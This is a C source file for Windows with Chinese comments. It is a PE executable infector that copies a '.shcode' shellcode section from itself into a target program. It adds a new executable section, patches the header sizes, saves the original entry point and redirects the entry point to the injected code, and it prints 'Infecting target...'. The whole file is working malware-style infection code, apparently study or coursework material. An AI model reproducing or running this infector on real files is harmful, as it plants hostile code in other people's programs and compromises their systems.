#include <stdio.h>
#include <windows.h>

HMODULE GetModHandle();
IMAGE_DOS_HEADER *GetDosHdr(HMODULE hMod);
IMAGE_NT_HEADERS32 *GetNtHdr(IMAGE_DOS_HEADER *dosHdr);
IMAGE_SECTION_HEADER *GetShcodeHdr(IMAGE_NT_HEADERS32 *ntHdr);
HANDLE OpenTargetFile(char *fileName);
IMAGE_DOS_HEADER GetTargetDosHdr(HANDLE hFile);
IMAGE_NT_HEADERS32 GetTargetNtHdr(HANDLE hFile, DWORD ntOffset);
DWORD CheckSectHdrSpace(IMAGE_NT_HEADERS32 *ntHdr, DWORD ntOffset);
IMAGE_SECTION_HEADER GetLastSectHdr(HANDLE hFile, DWORD sectHdrsEnd);
IMAGE_SECTION_HEADER SetShcodeHdr(HANDLE hFile,
                                  IMAGE_SECTION_HEADER *selfShcodeHdr,
                                  IMAGE_SECTION_HEADER *targetLastSectHdr,
                                  IMAGE_NT_HEADERS32 *targetNtHdr);
void ModifyHdrs(HANDLE hFile, DWORD ntOffset, IMAGE_NT_HEADERS32 *ntHdr, IMAGE_SECTION_HEADER *shcodeHdr);
void InsertShcode(HANDLE hFile,
                  DWORD targetSectHdrsEnd,
                  IMAGE_SECTION_HEADER *targetShcodeHdr,
                  HMODULE hMod,
                  IMAGE_SECTION_HEADER *selfShcodeHdr);
void ReplaceEntryPoint(HANDLE hFile, DWORD ntOffset, IMAGE_NT_HEADERS32 *ntHdr, IMAGE_SECTION_HEADER *shcodeHdr);


int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf_s("Usage: %s <target file>\n", argv[0]);
        system("PAUSE");
        return 1;
    }
    char *targetName = argv[1];

    printf_s("Getting self info...\n");
    HMODULE hMod = GetModHandle();
    IMAGE_DOS_HEADER *selfDosHdr = GetDosHdr(hMod);
    IMAGE_NT_HEADERS32 *selfNtHdr = GetNtHdr(selfDosHdr);
    IMAGE_SECTION_HEADER *selfShcodeHdr = GetShcodeHdr(selfNtHdr);

    printf_s("Getting target info...\n");
    HANDLE targetFile = OpenTargetFile(targetName);
    IMAGE_DOS_HEADER targetDosHdr = GetTargetDosHdr(targetFile);
    DWORD targetNtOffset = targetDosHdr.e_lfanew;
    IMAGE_NT_HEADERS32 targetNtHdr = GetTargetNtHdr(targetFile, targetNtOffset);
    DWORD targetSectHdrsEnd = CheckSectHdrSpace(&targetNtHdr, targetNtOffset);
    IMAGE_SECTION_HEADER targetLastSectHdr = GetLastSectHdr(targetFile, targetSectHdrsEnd);
    IMAGE_SECTION_HEADER targetShcodeHdr = SetShcodeHdr(targetFile, selfShcodeHdr, &targetLastSectHdr, &targetNtHdr);

    printf_s("Infecting target...\n");
    ModifyHdrs(targetFile, targetNtOffset, &targetNtHdr, &targetShcodeHdr);
    InsertShcode(targetFile, targetSectHdrsEnd, &targetShcodeHdr, hMod, selfShcodeHdr);
    ReplaceEntryPoint(targetFile, targetNtOffset, &targetNtHdr, &targetShcodeHdr);

    CloseHandle(targetFile);
    printf_s("Success!\n");

    system("PAUSE");
    return 0;
}

// 获取本程序的句柄
HMODULE GetModHandle()
{
    HMODULE hMod = GetModuleHandle(NULL);
    if (hMod == NULL) {
        printf_s("Failed to get module handle: %d\n", GetLastError());
        system("PAUSE");
        exit(1);
    }
    return hMod;
}

// 获取并验证 DOS 头是否为 MZ
IMAGE_DOS_HEADER *GetDosHdr(HMODULE hMod)
{
    IMAGE_DOS_HEADER *dosHdr = (IMAGE_DOS_HEADER *)hMod;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf_s("Invalid DOS signature\n");
        system("PAUSE");
        exit(1);
    }
    return dosHdr;
}

// 获取并验证 NT 头是否为 PE
IMAGE_NT_HEADERS32 *GetNtHdr(IMAGE_DOS_HEADER *dosHdr)
{
    IMAGE_NT_HEADERS32 *ntHdr = (IMAGE_NT_HEADERS32 *)((BYTE *)dosHdr + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf_s("Invalid NT signature\n");
        system("PAUSE");
        exit(1);
    }
    return ntHdr;
}

// 获取自身 shellcode 节头
IMAGE_SECTION_HEADER *GetShcodeHdr(IMAGE_NT_HEADERS32 *ntHdr)
{
    IMAGE_SECTION_HEADER *sectHdr = IMAGE_FIRST_SECTION(ntHdr);
    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; ++i) {
        if (strcmp((char *)sectHdr->Name, ".shcode") == 0) {
            return sectHdr;
        }
        sectHdr++;
    }
    printf_s("None section named \".shcode\"\n");
    system("PAUSE");
    exit(1);
}

// 打开待感染文件
HANDLE OpenTargetFile(char *fileName)
{
    HANDLE hFile = CreateFileA(fileName,
                               GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (hFile == NULL) {
        printf_s("Failed to open target file\n");
        system("PAUSE");
        exit(1);
    }
    return hFile;
}

// 获取待感染文件的 DOS 头
IMAGE_DOS_HEADER GetTargetDosHdr(HANDLE hFile)
{
    IMAGE_DOS_HEADER dosHdr = {0};
    DWORD cnt = 0;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, &dosHdr, sizeof(dosHdr), &cnt, NULL);
    if (dosHdr.e_magic != IMAGE_DOS_SIGNATURE) {
        printf_s("Invalid DOS signature\n");
        system("PAUSE");
        exit(1);
    }
    return dosHdr;
}

// 获取待感染文件的 NT 头
IMAGE_NT_HEADERS32 GetTargetNtHdr(HANDLE hFile, DWORD ntOffset)
{
    IMAGE_NT_HEADERS32 ntHdr = {0};
    DWORD cnt = 0;
    SetFilePointer(hFile, ntOffset, NULL, FILE_BEGIN);
    ReadFile(hFile, &ntHdr, sizeof(ntHdr), &cnt, NULL);
    if (ntHdr.Signature != IMAGE_NT_SIGNATURE) {
        printf_s("Invalid NT signature\n");
        system("PAUSE");
        exit(1);
    }
    return ntHdr;
}

// 检查待感染文件是否有足够空间添加 shellcode 节头，返回节头结束位置
DWORD CheckSectHdrSpace(IMAGE_NT_HEADERS32 *ntHdr, DWORD ntOffset)
{
    DWORD sectHdrsEnd =
            ntOffset + sizeof(IMAGE_NT_HEADERS32) + ntHdr->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (ntHdr->OptionalHeader.SizeOfHeaders - sectHdrsEnd < sizeof(IMAGE_SECTION_HEADER)) {
        printf_s("No enough space to add section\n");
        system("PAUSE");
        exit(1);
    }
    return sectHdrsEnd;
}

// 获取待感染文件的最后一个节头，并检查是否已被感染
IMAGE_SECTION_HEADER GetLastSectHdr(HANDLE hFile, DWORD sectHdrsEnd)
{
    IMAGE_SECTION_HEADER lastSectHdr = {0};
    DWORD cnt = 0;
    SetFilePointer(hFile, sectHdrsEnd - sizeof(IMAGE_SECTION_HEADER), NULL, FILE_BEGIN);
    ReadFile(hFile, &lastSectHdr, sizeof(lastSectHdr), &cnt, NULL);
    if (strcmp((char *)lastSectHdr.Name, ".shcode") == 0) {
        printf_s("Already infected\n");
        system("PAUSE");
        exit(1);
    }
    return lastSectHdr;
}

// 设置新的 shellcode 节头
IMAGE_SECTION_HEADER SetShcodeHdr(HANDLE hFile,
                                  IMAGE_SECTION_HEADER *selfShcodeHdr,
                                  IMAGE_SECTION_HEADER *targetLastSectHdr,
                                  IMAGE_NT_HEADERS32 *targetNtHdr)
{
    DWORD targetSize = GetFileSize(hFile, NULL);
    IMAGE_SECTION_HEADER shcodeHdr = {0};
    memcpy(shcodeHdr.Name, selfShcodeHdr->Name, 0x08);
    shcodeHdr.Misc.VirtualSize = selfShcodeHdr->Misc.VirtualSize;
    shcodeHdr.VirtualAddress = targetLastSectHdr->VirtualAddress +
                               (targetLastSectHdr->Misc.VirtualSize / targetNtHdr->OptionalHeader.SectionAlignment +
                                1) * targetNtHdr->OptionalHeader.SectionAlignment;
    shcodeHdr.SizeOfRawData = (selfShcodeHdr->Misc.VirtualSize / targetNtHdr->OptionalHeader.FileAlignment + 1) *
                              targetNtHdr->OptionalHeader.FileAlignment;
    shcodeHdr.PointerToRawData = targetSize;
    shcodeHdr.PointerToRelocations = 0;
    shcodeHdr.PointerToLinenumbers = 0;
    shcodeHdr.NumberOfRelocations = 0;
    shcodeHdr.NumberOfLinenumbers = 0;
    shcodeHdr.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    return shcodeHdr;
}

// 修改待感染文件节的数量、code 大小、image 大小
void ModifyHdrs(HANDLE hFile, DWORD ntOffset, IMAGE_NT_HEADERS32 *ntHdr, IMAGE_SECTION_HEADER *shcodeHdr)
{
    DWORD cnt = 0;
    ntHdr->FileHeader.NumberOfSections += 1;
    SetFilePointer(hFile, ntOffset, NULL, FILE_BEGIN);
    WriteFile(hFile, ntHdr, sizeof(*ntHdr), &cnt, NULL);
    ntHdr->OptionalHeader.SizeOfCode += shcodeHdr->SizeOfRawData;
    SetFilePointer(hFile, ntOffset + 0x1C, NULL, FILE_BEGIN);
    WriteFile(hFile, &ntHdr->OptionalHeader.SizeOfCode, sizeof(ntHdr->OptionalHeader.SizeOfCode), &cnt, NULL);
    ntHdr->OptionalHeader.SizeOfImage += (shcodeHdr->Misc.VirtualSize / ntHdr->OptionalHeader.SectionAlignment + 1) *
                                         ntHdr->OptionalHeader.SectionAlignment;
    SetFilePointer(hFile, ntOffset + 0x50, NULL, FILE_BEGIN);
    WriteFile(hFile, &ntHdr->OptionalHeader.SizeOfImage, sizeof(ntHdr->OptionalHeader.SizeOfImage), &cnt, NULL);
}

// 插入新的节头和节到待感染文件
void InsertShcode(HANDLE hFile,
                  DWORD targetSectHdrsEnd,
                  IMAGE_SECTION_HEADER *targetShcodeHdr,
                  HMODULE hMod,
                  IMAGE_SECTION_HEADER *selfShcodeHdr)
{
    DWORD cnt = 0;
    SetFilePointer(hFile, targetSectHdrsEnd, NULL, FILE_BEGIN);
    WriteFile(hFile, targetShcodeHdr, sizeof(*targetShcodeHdr), &cnt, NULL);
    PVOID shcodeSect = malloc(targetShcodeHdr->SizeOfRawData);
    memset(shcodeSect, 0xCC, targetShcodeHdr->SizeOfRawData);
    memcpy(shcodeSect, (PVOID)((PBYTE)hMod + selfShcodeHdr->VirtualAddress), selfShcodeHdr->Misc.VirtualSize);
    SetFilePointer(hFile, targetShcodeHdr->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(hFile, shcodeSect, targetShcodeHdr->SizeOfRawData, &cnt, NULL);
    free(shcodeSect);
}

// 保存待感染文件的旧入口点，设置新入口点
void ReplaceEntryPoint(HANDLE hFile, DWORD ntOffset, IMAGE_NT_HEADERS32 *ntHdr, IMAGE_SECTION_HEADER *shcodeHdr)
{
    DWORD cnt = 0;
    DWORD oldEntryPoint = ntHdr->OptionalHeader.AddressOfEntryPoint;
    SetFilePointer(hFile, ntOffset - 0x04, NULL, FILE_BEGIN);
    WriteFile(hFile, &oldEntryPoint, sizeof(oldEntryPoint), &cnt, NULL);
    DWORD newEntryPoint = shcodeHdr->VirtualAddress;
    SetFilePointer(hFile, ntOffset + 0x28, NULL, FILE_BEGIN);
    WriteFile(hFile, &newEntryPoint, sizeof(newEntryPoint), &cnt, NULL);
}
